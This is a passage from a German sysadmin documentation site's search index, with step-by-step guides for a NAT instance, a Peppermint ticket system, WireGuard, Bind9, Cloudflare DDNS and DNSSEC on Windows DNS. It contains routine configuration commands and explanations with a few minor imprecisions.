Sie im Detailbereich auf \"Aktionen\" und w\u00e4hlen Sie \"Netzwerkschnittstellen \u00e4ndern\". Klicken Sie auf das Eingabefeld und w\u00e4hlen Sie die Netzwerkschnittstelle aus, die der Instanz zugeordnet ist. Klicken Sie auf das Zahnradsymbol und deaktivieren Sie die Option \"Source/Destination Check\".</p>"},{"location":"Privat/nat-instanz/#schritt-5-iptables","title":"Schritt 5: iptables","text":"<p>Konfigurieren Sie die iptables-Regeln</p> <p>F\u00fchren Sie die folgenden Befehle aus, um die iptables-Regeln f\u00fcr die NAT-Instanz zu konfigurieren:</p> <pre><code>sudo iptables -t nat -A POSTROUTING -o eth0 -s 10.0.0.0/16 -j MASQUERADE\n</code></pre> <p>Ersetzen Sie eth0 durch den Namen der Netzwerkschnittstelle, die mit dem Internet verbunden ist, und 10.0.0.0/16 durch den CIDR-Block Ihres privaten Subnetzes.</p> <p>Speichern Sie die iptables-Regeln dauerhaft, indem Sie den folgenden Befehl ausf\u00fchren:</p> <pre><code>sudo iptables-save | sudo tee /etc/sysconfig/iptables\n</code></pre>"},{"location":"Privat/nat-instanz/#schritt-6-vpc-route-erstellen","title":"Schritt 6: VPC Route Erstellen","text":"<p>Erstellen Sie eine neue Route f\u00fcr das private Subnetz</p> <p>Gehen Sie zur VPC-Managementkonsole und w\u00e4hlen Sie die Routingtabelle f\u00fcr das private Subnetz aus. F\u00fcgen Sie eine neue Route hinzu, bei der das Ziel 0.0.0.0/0 ist und die Ziel-Instanz-ID die ID Ihrer NAT-Instanz ist.</p>"},{"location":"Privat/nat-instanz/#schritt-7-testen","title":"Schritt 7: Testen","text":"<p>Testen Sie die Verbindung</p> <p>Melden Sie sich bei einer Instanz im privaten Subnetz an und testen Sie die Verbindung</p>"},{"location":"Privat/ticket-system/","title":"Ticket system (Peppermint)","text":""},{"location":"Privat/ticket-system/#hardware","title":"Hardware","text":"<p>Als erster Schritt ben\u00f6tigt man Hardware. Man kann das entweder on-premises oder in der Cloud durchf\u00fchren. F\u00fcr dieses Beispiel habe ich mich f\u00fcr die Hetzner Cloud entschieden, aber es funktioniert auch mit anderen Anbietern.</p> <p></p> <p></p>"},{"location":"Privat/ticket-system/#verbinden-und-peppermint-installieren-docker","title":"Verbinden und Peppermint Installieren (Docker)","text":"<p>Nachdem man ein System hat, auf dem man Peppermint installieren m\u00f6chte, verbindet man sich damit.</p> <p></p> <p>Danach f\u00fchrt man folgende Befehle aus:</p> <pre><code>sudo apt update\nsudo apt upgrade -y\nsudo apt install docker.io docker-compose -y\nmkdir peppermint\ncd peppermint\nnano docker-compose.yml\n</code></pre> <p>In das docker-compose.yml-File f\u00fcgt man den folgenden Inhalt ein:</p> <p>docker-compose.yml<pre><code>version: \"3.1\"\n\nservices:\n  postgres:\n    container_name: postgres\n    image: postgres:latest\n    restart: always\n    volumes:\n      - ./docker-data/db:/data/db\n    environment: \n      POSTGRES_USER: peppermint\n      POSTGRES_PASSWORD: 1234\n      POSTGRES_DB: peppermint\n\n  client:\n    container_name: peppermint\n    image: pepperlabs/peppermint:latest\n    ports:\n      - 5000:5000\n    restart: on-failure\n    depends_on:\n      - postgres\n    environment:\n      PORT: 5000\n      DB_USERNAME: peppermint\n      DB_PASSWORD: 1234\n      DB_HOST: 'postgres'\n      BASE_URL: \"http://{Your IP or DNS}:5000\"\n</code></pre> Quelle: https://github.com/Peppermint-Lab/peppermint</p> <p>Wenn dies erledigt ist, speichern Sie die Datei und f\u00fchren Sie die folgenden Befehle aus:</p> <pre><code>sudo docker-compose up -d\nsudo docker ps\n</code></pre> <p></p>"},{"location":"Privat/ticket-system/#testen-anmelden","title":"Testen / Anmelden","text":"<p>Wenn alles erledigt ist, verbinden Sie sich / melden Sie sich auf der Seite http://{Ihre IP oder DNS}:5000 an.</p> <p></p> <p></p>"},{"location":"Privat/wireguard-server/","title":"Wireguard Server Installation","text":""},{"location":"Privat/wireguard-server/#installation","title":"Installation","text":"DebianAmazon Linux 2 <p>Aktualisieren Sie das System und installieren Sie ben\u00f6tigte Pakete</p> <pre><code>sudo apt update\nsudo apt upgrade\nsudo apt install linux-headers-$(uname -r) wireguard\n</code></pre> <p>Installieren Sie das EPEL-Repository und aktualisieren Sie das System</p> <pre><code>sudo amazon-linux-extras install epel\nsudo yum update\nsudo yum install wireguard-tools\n</code></pre>"},{"location":"Privat/wireguard-server/#allgemein","title":"Allgemein:","text":""},{"location":"Privat/wireguard-server/#schritt-1-konfigurations-datei","title":"Schritt 1: Konfigurations Datei","text":"<p>Erstellen Sie die WireGuard-Konfigurationsdatei</p> <pre><code>sudo mkdir /etc/wireguard\nsudo nano /etc/wireguard/wg0.conf\n</code></pre>"},{"location":"Privat/wireguard-server/#schritt-2-konfiguration","title":"Schritt 2: Konfiguration","text":"<p>F\u00fcgen Sie die folgende Konfiguration in die Datei ein und passen Sie sie nach Bedarf an</p> /etc/wireguard/wg0.conf<pre><code>[Interface]\nAddress = 10.0.0.1/24, fd42:42:42::1/64\nPrivateKey = &lt;ServerPrivateKey&gt;\nListenPort = 51820\n\n[Peer]\nPublicKey = &lt;ClientPublicKey&gt;\nAllowedIPs = 10.0.0.2/32, fd42:42:42::2/128\n</code></pre> <p>Ersetzen Sie \"ServerPrivateKey\" durch den privaten Schl\u00fcssel des Servers und \"ClientPublicKey\" durch den \u00f6ffentlichen Schl\u00fcssel des Clients. Vergeben Sie f\u00fcr jeden weiteren Client eine eigene IP-Adresse und f\u00fcgen Sie einen neuen [Peer]-Abschnitt hinzu.</p>"},{"location":"Privat/wireguard-server/#schritt-3-wireguard-starten","title":"Schritt 3: WireGuard Starten","text":"<p>Aktivieren und starten Sie den WireGuard-Server</p> <pre><code>sudo systemctl enable --now wg-quick@wg0\n</code></pre> <p>Nachdem Sie den WireGuard-Server auf Debian oder Amazon Linux 2 installiert und konfiguriert haben, m\u00fcssen Sie den entsprechenden Client konfigurieren, um eine Verbindung zum Server herzustellen.</p>"},{"location":"Privat/DNS/bind9/","title":"Bind9","text":"DebianAmazon Linux 2"},{"location":"Privat/DNS/bind9/#debian","title":"Debian","text":""},{"location":"Privat/DNS/bind9/#schritt-1-installation","title":"Schritt 1: Installation","text":"<p>Aktualisieren Sie das System und installieren Sie Bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 bind9utils bind9-doc\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-2-zone-erstellen","title":"Schritt 2: Zone erstellen","text":"<p>Erstellen Sie eine neue Zone-Datei f\u00fcr Ihre Testdomain (z. B. example.com). Erstellen Sie die Datei /etc/bind/zones/db.example.com und f\u00fcgen Sie den folgenden Inhalt ein:</p> /etc/bind/zones/db.example.com<pre><code>$TTL    86400\n@       IN      SOA     ns1.clearsky.com. admin.clearsky.com. (\n2022032201         ; Serial\n                            3600         ; Refresh\n                            1800         ; Retry\n                            604800         ; Expire\n                            86400 )       ; Minimum TTL\n\n; Name Servers\nclearsky.com.     IN      NS      ns1.clearsky.com.\n\n; A records\nns1  IN      A       192.168.1.1\nclearsky.com.   IN      A       192.168.1.2\n\n; Alias records\nerp.clearsky.com.    IN      CNAME   clearsky.com.\nwww.clearsky.com.    IN      CNAME   clearsky.com.\n</code></pre> <p>Passen Sie den Domainnamen, die E-Mail-Adresse und die IP-Adressen entsprechend Ihren Anforderungen an.</p>"},{"location":"Privat/DNS/bind9/#schritt-3-zone-hinzufugen","title":"Schritt 3: Zone hinzuf\u00fcgen","text":"<p>\u00d6ffnen Sie die Bind9-Konfigurationsdatei /etc/bind/named.conf.local und f\u00fcgen Sie Ihre Zone hinzu:</p> /etc/bind/named.conf.local<pre><code>zone \"example.com\" {\ntype master;\nfile \"/etc/bind/zones/db.example.com\";\n};\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-4-trust-lokalem-netzwerk","title":"Schritt 4: Trust Lokalem Netzwerk","text":"<p>\u00c4ndern Sie die Bind9-Optionen in der Datei /etc/bind/named.conf.options.</p> <p>Zum Beispiel, um DNS-Anfragen von Ihrem lokalen Netzwerk zuzulassen, f\u00fcgen Sie die folgenden Zeilen hinzu:</p> /etc/bind/named.conf.options.<pre><code>acl \"trusted\" {\n192.168.1.0/24;\n};\noptions {\n...\nallow-query { trusted; };\n...\n};\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-5-bind9-neustarten","title":"Schritt 5: bind9 neustarten","text":"<p>Starten Sie den Bind9-Dienst neu, um die neuen Einstellungen zu \u00fcbernehmen:</p> <pre><code>sudo systemctl restart bind9\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-6-check-konfiguration","title":"Schritt 6: Check Konfiguration","text":"<p>\u00dcberpr\u00fcfen Sie die Bind9-Konfiguration und stellen Sie sicher, dass keine Fehlermeldungen auftreten:</p> <pre><code>sudo named-checkconf\nsudo named-checkzone example.com /etc/bind/zones/db.example.com\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-7-testen","title":"Schritt 7: Testen","text":"<p>Testen Sie Ihre DNS-Konfiguration mit dig:</p> <pre><code>dig @localhost example.com\ndig @localhost www.example.com\n</code></pre> <p>Nun haben Sie erfolgreich Bind9 installiert und eine Testzone konfiguriert. Wenn Sie weitere Zonen hinzuf\u00fcgen oder die vorhandene Zone aktualisieren m\u00f6chten, wiederholen Sie die Schritte 2-6 und passen Sie die Dateien und Einstellungen entsprechend an.</p>"},{"location":"Privat/DNS/bind9/#amazon-linux-2","title":"Amazon Linux 2","text":""},{"location":"Privat/DNS/bind9/#schritt-1-installation_1","title":"Schritt 1: Installation","text":"<p>Aktualisieren Sie das System und installieren Sie Bind9:</p> <pre><code>sudo yum update\nsudo yum install bind bind-utils\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-2-zone-erstellen_1","title":"Schritt 2: Zone erstellen","text":"<p>Erstellen Sie eine neue Zone-Datei f\u00fcr Ihre Testdomain (z. B. example.com).</p> <p>Erstellen Sie die Datei /var/named/db.example.com und f\u00fcgen Sie den folgenden Inhalt ein:</p> /var/named/db.example.com<pre><code>$TTL    86400\n@       IN      SOA     ns1.clearsky.com. admin.clearsky.com. (\n2022032201         ; Serial\n                            3600         ; Refresh\n                            1800         ; Retry\n                            604800         ; Expire\n                            86400 )       ; Minimum TTL\n\n; Name Servers\nclearsky.com.     IN      NS      ns1.clearsky.com.\n\n; A records\nns1      IN      A       192.168.1.1\nclearsky.com.   IN      A       192.168.1.2\n\n; Alias records\nerp.clearsky.com.    IN      CNAME   clearsky.com.\nwww.clearsky.com.    IN      CNAME   clearsky.com.\n</code></pre> <p>Passen Sie den Domainnamen, die E-Mail-Adresse und die IP-Adressen entsprechend Ihren Anforderungen an.</p>"},{"location":"Privat/DNS/bind9/#schritt-3-zone-hinzufugen_1","title":"Schritt 3: Zone hinzuf\u00fcgen","text":"<p>\u00d6ffnen Sie die Bind9-Konfigurationsdatei /etc/bind/named.conf.local und f\u00fcgen Sie Ihre Zone hinzu:</p> /etc/bind/named.conf.local<pre><code>zone \"example.com\" {\ntype master;\nfile \"/var/named/db.example.com\";\n};\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-4-trust-lokalem-netzwerk_1","title":"Schritt 4: Trust Lokalem Netzwerk","text":"<p>\u00c4ndern Sie die Bind9-Optionen in der Datei /etc/named.conf.</p> <p>Zum Beispiel, um DNS-Anfragen von Ihrem lokalen Netzwerk zuzulassen, f\u00fcgen Sie die folgenden Zeilen hinzu:</p> /etc/named.conf.<pre><code>acl \"trusted\" {\n192.168.1.0/24;\n};\noptions {\n...\nallow-query { trusted; };\n...\n};\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-5-named-neustarten","title":"Schritt 5: named neustarten","text":"<p>Starten Sie den Bind9-Dienst neu, um die neuen Einstellungen zu \u00fcbernehmen:</p> <pre><code>sudo systemctl restart named\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-6-check-konfiguration_1","title":"Schritt 6: Check Konfiguration","text":"<p>\u00dcberpr\u00fcfen Sie die Bind9-Konfiguration und stellen Sie sicher, dass keine Fehlermeldungen auftreten:</p> <pre><code>sudo named-checkconf\nsudo named-checkzone example.com /var/named/db.example.com\n</code></pre>"},{"location":"Privat/DNS/bind9/#schritt-7-testen_1","title":"Schritt 7: Testen","text":"<p>Testen Sie Ihre DNS-Konfiguration mit dig:</p> <pre><code>dig @localhost example.com\ndig @localhost www.example.com\n</code></pre> <p>Nun haben Sie erfolgreich Bind9 auf Amazon Linux 2 installiert und eine Testzone konfiguriert. Wenn Sie weitere Zonen hinzuf\u00fcgen oder die vorhandene Zone aktualisieren m\u00f6chten, wiederholen Sie die Schritte 2-6 und passen Sie die Dateien und Einstellungen entsprechend an.</p>"},{"location":"Privat/DNS/ddns/","title":"DDNS mit Cloudflare","text":""},{"location":"Privat/DNS/ddns/#schritt-1-installation-von-git-und-clonen","title":"Schritt 1: Installation von git und clonen","text":"<p>Updaten des Repositories, Herunterladen von git und Clonen des \"cloudflare-ddns-updater\".</p> <pre><code>sudo su -\n</code></pre> <pre><code>apt update\napt install git -y\ngit clone https://github.com/K0p1-Git/cloudflare-ddns-updater\n</code></pre>"},{"location":"Privat/DNS/ddns/#schritt-2-vorbereiten-des-sh-scriptes","title":"Schritt 2: Vorbereiten des .sh Scriptes","text":"<p>In das Verzeichniss \"cloudflare-ddns-updater\" gehen, Template kopieren und in cloudflare.sh reingehen.</p> <pre><code>cd cloudflare-ddns-updater\ncp cloudflare-template.sh cloudflare.sh\nnano cloudflare.sh\n</code></pre>"},{"location":"Privat/DNS/ddns/#schritt-3-anpassen-des-sh-scriptes","title":"Schritt 3: Anpassen des .sh Scriptes","text":"<p>Im unteren Script m\u00fcssen Sie noch ein paar dinge \u00e4ndern: - auth_email: Mailadresse des Cloudflare Kontos - auth_key: \"Cloudflare Overview\"/\"Get your API token\"/\"Global API Key\" - zone_identifier: Zone ID auf der Cloudflare Overview - record_name: Name des eintrages der per DDNS ge\u00e4ndert werden soll z. B. www.google.com</p> cloudflare.sh<pre><code>#!/bin/bash\n## change to \"bin/sh\" when necessary\nauth_email=\"&lt;auth_email&gt;\"                                       # The email used to login 'https://dash.&gt;\nauth_method=\"global\"                                 # Set to \"global\" for Global API Key or \"token\" for Scoped API Tok&gt;\nauth_key=\"&lt;auth_key&gt;\"                                         # Your API Token or Global API&gt;\nzone_identifier=\"&lt;zone_identifier&gt;\"                                  # Can be found in the \"Overview\" ta&gt;\nrecord_name=\"&lt;record_name&gt;\"                                      # Which record you want to be synced\nttl=\"3600\"                                          # Set the DNS TTL (seconds)\nproxy=\"false\"                                       # Set the proxy to true or false\nsitename=\"\"                                         # Title of site \"Example Site\"\nslackchannel=\"\"                                     # Slack Channel #example\nslackuri=\"\"                                         # URI for Slack WebHook \"https://hooks.slack.com/services/xxxxx\"\ndiscorduri=\"\"                                       # URI for Discord WebHook \"https://discordapp.com/api/webhooks/xxxx&gt;\n</code></pre>"},{"location":"Privat/DNS/ddns/#schritt-4-script-testen","title":"Schritt 4: Script testen","text":"<pre><code>chmod +x cloudflare.sh\n./cloudflare.sh\n</code></pre>"},{"location":"Privat/DNS/ddns/#schritt-5-task-erstellen","title":"Schritt 5: Task erstellen","text":"<pre><code>crontab -e\n</code></pre> <p>Inhalt einf\u00fcgen (Jede Minute):</p> <pre><code>*/1 * * * * /bin/bash /root/cloudflare-ddns-updater/cloudflare.sh\n</code></pre> <p>Service neustarten: <pre><code>systemctl restart cron.service\n</code></pre></p>"},{"location":"Privat/DNS/DNSSEC/dnssec-windows-server-AD/","title":"DNSSEC auf Windows DNS einrichten (AD Umgebung)","text":"<p>Als erstest kontrolliert man den DNSSEC stand mit dem folgenden befehl. Dieser Befehl sucht nach der IP-Adresse des Hostnamens \"main.corp.fenaco.com\" unter Verwendung des DNS-Servers \"fensrv092111\" und \u00fcberpr\u00fcft dabei den DNSSEC-Status.</p> <pre><code>Resolve-DnsName main.corp.fenaco.com -Server fensrv092111 -dnssecok\n</code></pre> <p></p> <p>Im DNS-Manager navigieren Sie zu Ihrem Dom\u00e4nennamen. Klicken Sie mit der rechten Maustaste auf den Dom\u00e4nennamen und w\u00e4hlen Sie \"DNSSEC\" aus. Anschlie\u00dfend klicken Sie auf \"Zone signieren\".</p> <p></p> <p>Im Interface des Zone Signing Wizard klicken Sie auf \"Weiter\".</p> <p></p> <p>Im Interface f\u00fcr die Signierungsoptionen klicken Sie auf \"Customize zone signing parameters\" und anschlie\u00dfend auf \"Weiter\".</p> <p>Durch die Auswahl von \"Customize zone signing parameters\" haben Sie die M\u00f6glichkeit, die Signierungseinstellungen f\u00fcr Ihre Zone individuell anzupassen. Dies erm\u00f6glicht Ihnen eine feinere Kontrolle \u00fcber den Signierungsprozess und die Sicherheit Ihrer DNS-Zone.</p> <p>Alternativ dazu k\u00f6nnen Sie auch andere Optionen in Betracht ziehen, wie z.B. \"Use default settings to sign the zone\", bei dem vorgegebene Signierungseinstellungen automatisch angewendet werden. Diese Option ist empfehlenswert, wenn Sie sich nicht mit den detaillierten Parametern der Signierung befassen m\u00f6chten und eine einfache, standardisierte Konfiguration bevorzugen.</p> <p>Durch die Auswahl der Option \"Sign the zone with parameters of an existing zone\" k\u00f6nnen Sie die bereits konfigurierten Signaturparameter einer anderen Zone \u00fcbernehmen und f\u00fcr die Signierung Ihrer aktuellen Zone verwenden. Dies kann n\u00fctzlich sein, wenn Sie bereits eine Zone mit den gew\u00fcnschten Signaturparametern haben und diese f\u00fcr die neue Zone wiederverwenden m\u00f6chten, anstatt die Parameter manuell anzupassen.</p> <p></p> <p>Als Keymaster-Server sollte ein dedizierter und hochsicherer Server verwendet werden. Idealerweise sollte der Keymaster-Server nicht derselbe Server sein, der auch f\u00fcr die DNS-Infrastruktur oder andere kritische Dienste verwendet wird. Dadurch wird das Risiko einer Kompromittierung der Schl\u00fcssel reduziert.</p> <p>Die Hauptfunktionen eines Keymaster-Servers:</p> <p>Schl\u00fcsselgenerierung: Der Keymaster-Server erzeugt neue kryptografische Schl\u00fcssel nach den gew\u00fcnschten Standards und Algorithmen.</p> <p>Schl\u00fcsselspeicherung: Der Keymaster-Server verwaltet den sicheren Speicher der erzeugten Schl\u00fcssel. Dies kann entweder in einer speziellen Hardwarekomponente wie einem Hardware Security Module (HSM) oder in verschl\u00fcsselten Software-Tresoren erfolgen.</p> <p></p> <p>Der KSK (Key Signing Key) ist ein spezieller kryptografischer Schl\u00fcssel, der f\u00fcr das Signieren von Zonenschl\u00fcsseln in DNSSEC verwendet wird. Er dient dazu, die Vertrauenskette im DNSSEC-System zu etablieren und sicherzustellen, dass die signierten Zonenschl\u00fcssel g\u00fcltig und vertrauensw\u00fcrdig sind. Der KSK ist eine wichtige Komponente f\u00fcr die Sicherheit und Integrit\u00e4t des Domain Name Systems.</p> <p></p> <p></p> <p>Cryptographic algorithm = Es gibt verschiedene Algorithmen wie RSA, DSA oder ECDSA.</p> <p>Key length (Bits) = Die Schl\u00fcssell\u00e4nge gibt an, wie lang der KSK in Bits ist. Eine l\u00e4ngere Schl\u00fcssell\u00e4nge bietet normalerweise eine h\u00f6here Sicherheit, aber auch eine gr\u00f6\u00dfere Berechnungs- und Verarbeitungszeit. Die empfohlene Schl\u00fcssell\u00e4nge f\u00fcr den KSK kann von den Standards und Best Practices der jeweiligen DNSSEC-Implementierung abh\u00e4ngen. In der Regel sind Schl\u00fcssell\u00e4ngen von 2048 Bits oder h\u00f6her angemessen.</p> <p>Select a key storage provider to generate and store keys = Bei der Auswahl eines Key Storage Providers geht es darum, einen sicheren Speicherort f\u00fcr den KSK zu w\u00e4hlen. Dies kann ein Hardware Security Module (HSM), ein spezielles Sicherheitsger\u00e4t oder ein verschl\u00fcsselter Software-Tresor sein. Die Wahl des Anbieters h\u00e4ngt von den Sicherheitsanforderungen, der Skalierbarkeit und den verf\u00fcgbaren Optionen ab.</p> <p>DNSKEY RRSET signature validity period (hours) = Die G\u00fcltigkeitsdauer der DNSKEY RRSET-Signatur gibt an, wie lange die Signatur f\u00fcr den KSK g\u00fcltig ist, bevor sie erneuert oder aktualisiert werden muss. Eine l\u00e4ngere G\u00fcltigkeitsdauer reduziert die Notwendigkeit h\u00e4ufiger Signaturaktualisierungen, erh\u00f6ht jedoch auch das Risiko bei Kompromittierung des Schl\u00fcssels.</p> <p>Enable automatic rollover = Die automatische Rollover-Funktion erm\u00f6glicht die automatische Aktualisierung und Erneuerung des KSKs nach einer bestimmten Zeit oder nach festgelegten Ereignissen. Dies gew\u00e4hrleistet eine kontinuierliche Sicherheit und Schl\u00fcsselaktualisierung, um m\u00f6gliche Sicherheitsrisiken zu minimieren. Die Aktivierung der automatischen Rollover-Funktion wird empfohlen, um den KSK regelm\u00e4\u00dfig zu erneuern und sicherzustellen, dass er immer auf dem aktuellen Stand ist.</p> <p></p> <p></p> <p>ZSK steht f\u00fcr \"Zone Signing Key\" und ist ein kryptografischer Schl\u00fcssel, der zur Signierung von DNS-Zonen verwendet wird. Er dient dazu, die Integrit\u00e4t und Authentizit\u00e4t von DNS-Daten sicherzustellen. Der ZSK wird normalerweise regelm\u00e4\u00dfig gewechselt, um die Sicherheit der Signierung zu gew\u00e4hrleisten.</p> <p>Der Hauptunterschied zwischen ZSK und KSK besteht darin, dass ZSKs verwendet werden, um DNS-Zonen zu signieren, w\u00e4hrend KSKs verwendet werden, um die ZSKs selbst zu signieren. KSKs haben eine l\u00e4ngere Lebensdauer und dienen dazu, die Vertrauenskette im DNSSEC-System zu etablieren und zu erhalten, w\u00e4hrend ZSKs h\u00e4ufiger gewechselt werden, um die Sicherheit der Signierung zu gew\u00e4hrleisten. Zusammen arbeiten ZSKs und KSKs, um die Integrit\u00e4t und Authentizit\u00e4t von DNS-Daten sicherzustellen und eine sichere Kommunikation im DNSSEC-System zu erm\u00f6glichen.</p> <p></p> <p></p> <p>Cryptographic algorithm = Es gibt verschiedene Algorithmen wie RSA, DSA oder ECDSA.</p> <p>Key length (Bits) = Die Schl\u00fcssell\u00e4nge gibt an, wie lang der KSK in Bits ist. Eine l\u00e4ngere Schl\u00fcssell\u00e4nge bietet normalerweise eine h\u00f6here Sicherheit, aber auch eine gr\u00f6\u00dfere Berechnungs- und Verarbeitungszeit. Die empfohlene Schl\u00fcssell\u00e4nge f\u00fcr den KSK kann von den Standards und Best Practices der jeweiligen DNSSEC-Implementierung abh\u00e4ngen. In der Regel sind Schl\u00fcssell\u00e4ngen von 2048 Bits oder h\u00f6her angemessen.</p> <p>Select a key storage provider to generate and store keys = Bei der Auswahl eines Key Storage Providers geht es darum, einen sicheren Speicherort f\u00fcr den KSK zu w\u00e4hlen. Dies kann ein Hardware Security Module (HSM), ein spezielles Sicherheitsger\u00e4t oder ein verschl\u00fcsselter Software-Tresor sein. Die Wahl des Anbieters h\u00e4ngt von den Sicherheitsanforderungen, der Skalierbarkeit und den verf\u00fcgbaren Optionen ab.</p> <p>DNSKEY Signature Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer der digitalen Signatur f\u00fcr den DNSKEY-Eintrag, der den \u00f6ffentlichen Teil des ZSK enth\u00e4lt. Es gibt an, wie lange die Signatur als g\u00fcltig betrachtet wird, bevor sie erneuert werden muss. Die empfohlene Wertebereich liegt in der Regel zwischen 24 und 48 Stunden.</p> <p>DS Signature Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer der digitalen Signatur f\u00fcr den DS-Eintrag, der den \u00f6ffentlichen Teil des KSK (Key Signing Key) repr\u00e4sentiert. Der DS-Eintrag wird von der \u00fcbergeordneten DNS-Zone verwendet, um den KSK des untergeordneten Bereichs zu \u00fcberpr\u00fcfen. Auch hier empfiehlt sich ein Wertebereich von 24 bis 48 Stunden.</p> <p>Zone Record Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer anderer DNS-Zoneneintr\u00e4ge, die von der ZSK signiert wurden. Es gibt an, wie lange diese Eintr\u00e4ge als g\u00fcltig betrachtet werden, bevor sie erneuert werden m\u00fcssen. Der empfohlene Wertebereich liegt normalerweise zwischen 24 und 72 Stunden, abh\u00e4ngig von den spezifischen Anforderungen des Systems und der beabsichtigten Aktualisierungsfrequenz.</p> <p></p> <p></p> <p>NSEC = (Next Secure) ist eine Methode, bei der ein spezieller DNS-Datensatz verwendet wird, um die Existenz einer DNS-Ressource zu best\u00e4tigen und gleichzeitig L\u00fccken in der Namensraumabdeckung offenzulegen. NSEC-Eintr\u00e4ge werden in einer sortierten Reihenfolge pr\u00e4sentiert und erm\u00f6glichen es DNS-Clients, effizient zu \u00fcberpr\u00fcfen, ob eine bestimmte DNS-Ressource existiert oder nicht. NSEC hat jedoch den Nachteil, dass es Informationen \u00fcber die vorhandenen DNS-Ressourcen preisgibt.</p> <p>NSEC3 ist eine Weiterentwicklung von NSEC, die entwickelt wurde, um die Offenlegung von Informationen in NSEC zu reduzieren. Bei NSEC3 werden die DNS-Namen mit einem kryptografischen Hash-Algorithmus und einem sogenannten Salz (Salt) verschl\u00fcsselt, um die L\u00fccken in der Namensraumabdeckung zu verbergen. Durch die Verwendung von NSEC3 k\u00f6nnen DNS-Clients immer noch \u00fcberpr\u00fcfen, ob eine bestimmte DNS-Ressource existiert, ohne dass alle vorhandenen DNS-Namen offengelegt werden.</p> <p>Iterations = Die Anzahl der Iterationen bestimmt die Anzahl der Hash-Berechnungen, die bei der Verwendung von NSEC3 durchgef\u00fchrt werden. Eine h\u00f6here Anzahl von Iterationen erh\u00f6ht die Sicherheit, kann jedoch auch die Leistung beeintr\u00e4chtigen. Ein guter Kompromiss ist normalerweise eine ausreichende Anzahl von Iterationen, um Brute-Force-Angriffe zu erschweren, ohne die Leistung signifikant zu beeintr\u00e4chtigen.</p> <p>Generate and use a random salt of length = Das Salz (Salt) ist eine zuf\u00e4llige Zeichenfolge, die zusammen mit dem DNS-Namen verwendet wird, um die Hash-Werte in NSEC3 zu berechnen. Die L\u00e4nge des Salzes kann variieren und sollte ausreichend sein, um Kollisionen zu vermeiden. Ein zuf\u00e4lliges und langes Salz erh\u00f6ht die Sicherheit des Systems.</p> <p>Use opt-out to cover unsigned delegations = Opt-out erm\u00f6glicht es, dass NSEC3-Eintr\u00e4ge f\u00fcr nicht signierte Subdom\u00e4nen automatisch generiert werden. Dies kann die Gr\u00f6\u00dfe der DNSSEC-Daten reduzieren und die Effizienz verbessern. Allerdings sollten die Auswirkungen auf die Sicherheit und die Kompatibilit\u00e4t mit DNS-Clients sorgf\u00e4ltig abgewogen werden.</p> <p></p> <p>\"Enable the distribution of trust anchors for this zone\" = Durch das Aktivieren dieser Option erm\u00f6glichen Sie die Verteilung der Trust-Anchors f\u00fcr Ihre DNS-Zone an andere DNS-Resolver. Trust-Anchors sind \u00f6ffentliche Schl\u00fcssel, die von Resolvern verwendet werden, um die DNSSEC-Signaturen in Ihrer Zone zu \u00fcberpr\u00fcfen. Die Verteilung der Trust-Anchors erleichtert die \u00dcberpr\u00fcfung der DNSSEC-Authentizit\u00e4t durch andere Systeme, die Ihre Zone abfragen.</p> <p>\"Enable automatic update of trust anchors on key rollover (RFC 5011)\" = Wenn Sie diese Option aktivieren, erlauben Sie die automatische Aktualisierung der Trust-Anchors bei einem Schl\u00fcsselwechsel (Key Rollover). RFC 5011 ist ein Standard, der beschreibt, wie DNSSEC-Resolver automatisch aktualisierte Trust-Anchors empfangen und akzeptieren k\u00f6nnen, ohne dass eine manuelle Intervention erforderlich ist. Diese Option gew\u00e4hrleistet, dass Resolver immer die aktuellen und g\u00fcltigen Trust-Anchors verwenden, wenn sich die Schl\u00fcssel in Ihrer DNS-Zone \u00e4ndern.</p> <p></p> <p>DS record generation algorithm = Dies bezieht sich auf den Algorithmus, der verwendet wird, um den DS (Delegation Signer) Record zu generieren. Der DS Record enth\u00e4lt den \u00f6ffentlichen Teil des Key Signing Key (KSK) und wird in der \u00fcbergeordneten DNS-Zone verwendet, um die DNSSEC-Validierung der untergeordneten Zone zu erm\u00f6glichen. Der Algorithmus bestimmt, wie der DS Record aus dem KSK generiert wird und kann beispielsweise RSA, DSA oder ECDSA sein.</p> <p>DS record TTL = TTL steht f\u00fcr \"Time-to-Live\" und gibt an, wie lange der DS Record im Cache der DNS-Resolver g\u00fcltig bleibt, bevor er erneut abgefragt werden muss. Ein niedriger TTL-Wert bedeutet, dass der DS Record h\u00e4ufiger aktualisiert und abgefragt wird, w\u00e4hrend ein h\u00f6herer TTL-Wert die Caching-Zeit verl\u00e4ngert und die Anzahl der Abfragen reduziert.</p> <p>DNSKEY record TTL = \u00c4hnlich wie der DS Record TTL gibt der DNSKEY Record TTL an, wie lange der DNSKEY Record, der den \u00f6ffentlichen Teil des Zone Signing Key (ZSK) enth\u00e4lt, im Cache der DNS-Resolver g\u00fcltig bleibt, bevor er erneut abgefragt werden muss. Auch hier beeinflusst der TTL-Wert die Caching-Zeit und die H\u00e4ufigkeit der Abfragen f\u00fcr den DNSKEY Record.</p> <p>Signature inception = Dies bezieht sich auf den Zeitpunkt, an dem die digitale Signatur f\u00fcr die DNS-Ressourcenaufzeichnungen (wie A-, MX- oder CNAME-Eintr\u00e4ge) in einer DNS-Zone erstellt wird. Die Signature Inception gibt an, ab wann die Signaturen als g\u00fcltig betrachtet werden und f\u00fcr die Validierung der DNSSEC-Antworten verwendet werden k\u00f6nnen. Die Signature Inception ist normalerweise ein Zeitpunkt in der Zukunft, um sicherzustellen, dass alle DNS-Resolver die neuen Signaturen erhalten, bevor sie verwendet werden m\u00fcssen.</p> <p></p> <p></p> <p></p> <p>In der DNS-Konsole erweitern Sie die Trust Points und \u00f6ffnen sie dann auf Ihren Dom\u00e4nennamen.</p> <p>Stellen Sie sicher, dass die DNSKEY-Ressourceneintr\u00e4ge angezeigt werden und ihr Status g\u00fcltig 